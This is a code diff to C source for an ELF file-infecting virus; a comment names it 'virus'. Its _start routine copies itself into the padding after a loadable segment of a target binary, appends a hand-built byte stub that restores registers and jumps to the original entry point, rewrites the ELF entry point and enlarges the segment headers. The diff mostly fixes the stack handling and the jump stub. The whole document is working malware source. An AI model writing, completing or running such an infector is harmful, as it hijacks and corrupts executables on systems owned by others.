@@ -123,13 +123,17 @@ static inline void _memcpy(long src_addr, long dst_addr, long size)
 void _start(void) __attribute__((aligned(16), section(".text")));
 void _start(void)
 {
+	/* handle stack manually.... yes this is fight agains compiler :( */
 	__asm__ __volatile__ (
-		"push %rbx\n"
-		"push %rdx\n"
-		"push %rcx\n"
-		"push %rsi\n"
-		"push %rdi\n"
-		"push %rbp\n"
+		"add $0x2e8, %rsp\n"
+		"pushq %rax\n"
+		"pushq %rbx\n"
+		"pushq %rdx\n"
+		"pushq %rcx\n"
+		"pushq %rsi\n"
+		"pushq %rdi\n"
+		"pushq %rbp\n"
+		"sub $0x2e8, %rsp\n"
 	);
 
 	char a[5];
@@ -139,7 +143,7 @@ void _start(void)
 	unsigned long offset;
 	unsigned long real_code_size;
 	Elf64_Half p;
-	unsigned char jmp[20];
+	unsigned char jmp[27];
 
 	/* Count size of _start function of virus */
 	real_code_size = (long)&&label2 - (long)&_start;
@@ -149,11 +153,7 @@ void _start(void)
 	a[3] = 'a';
 	a[4] = '\0';
 
-	/* change code */
-	/* movabs old_entry_point, %rax
-	 * add $0x2f8, %rsp
-	 * jmpq *%rax
-	 */
+	/* look at tail.asm file */
 	jmp[0] = '\x48';
 	jmp[1] = '\x81';
 	jmp[2] = '\xc4';
@@ -162,20 +162,29 @@ void _start(void)
 	jmp[5] = '\x00';
 	jmp[6] = '\x00';
 
-	jmp[7] = '\x49';
-	jmp[8] = '\xbb';
-	jmp[9] = '\x77';
-	jmp[10] = '\x77';
-	jmp[11] = '\x77';
-	jmp[12] = '\x77';
-	jmp[13] = '\x77';
-	jmp[14] = '\x77';
-	jmp[15] = '\x77';
-	jmp[16] = '\x77';
+	jmp[7] = '\x5d';
+	jmp[8] = '\x5f';
+	jmp[9] = '\x5e';
+	jmp[10] = '\x59';
+	jmp[11] = '\x5a';
+	jmp[12] = '\x5b';
+	jmp[13] = '\x58';
 
-	jmp[17] = '\x41';
-	jmp[18] = '\x53';
-	jmp[19] = '\xc3';
+
+	jmp[14] = '\x49';
+	jmp[15] = '\xbc';
+	jmp[16] = '\x77';
+	jmp[17] = '\x77';
+	jmp[18] = '\x77';
+	jmp[19] = '\x77';
+	jmp[20] = '\x77';
+	jmp[21] = '\x77';
+	jmp[22] = '\x77';
+	jmp[23] = '\x77';
+
+	jmp[24] = '\x41';
+	jmp[25] = '\x54';
+	jmp[26] = '\xc3';
 
 	/* loop: for all elf files in /home/user/bin */
 	volatile long fd = open(a, O_RDWR, 0);
@@ -199,7 +208,7 @@ void _start(void)
 		if (phdr.p_type != PT_LOAD) { continue; }
 		read(fd, &phdr_next, sizeof(phdr_next));
 
-		if ((phdr_next.p_offset - (phdr.p_offset + phdr.p_filesz)) < real_code_size) { continue; }
+		if ((phdr_next.p_offset - (phdr.p_offset + phdr.p_filesz) + sizeof(jmp)) < real_code_size) { continue; }
 
 		/* Padding in victim */
 		offset = phdr.p_offset + phdr.p_filesz;
@@ -207,11 +216,10 @@ void _start(void)
 		/* add code */
 		write(fd, (long)_start, real_code_size);
 
-
 		/* some instructions after label2 are not copyed
 		 * so I use this space to add jump... and stack cleanup
 		 */
-		_memcpy((long)&(ehdr.e_entry), (long)&(jmp[9]), 8);
+		_memcpy((long)&(ehdr.e_entry), (long)&(jmp[16]), 8);
 		write(fd, jmp, sizeof(jmp));
 
 		/* change elf header entry point */
@@ -220,21 +228,15 @@ void _start(void)
 		write(fd, &ehdr, sizeof(ehdr));
 
 		/* change phdr */
-		phdr.p_filesz += real_code_size;
+		phdr.p_filesz += real_code_size; 
+		phdr.p_filesz += sizeof(jmp); 
 		phdr.p_memsz += real_code_size;
+		phdr.p_memsz += sizeof(jmp); 
 		lseek(fd, ehdr.e_phoff + (p * sizeof(phdr)), SEEK_SET);
 		write(fd, &phdr, sizeof(phdr));
 		break;
 	}	
 	close(fd);
-	__asm__ __volatile__ (
-		"pop %rbp\n"
-		"pop %rdi\n"
-		"pop %rsi\n"
-		"pop %rcx\n"
-		"pop %rdx\n"
-		"pop %rbx\n"
-	);
 label2: ;
 	_exit(0);
 }
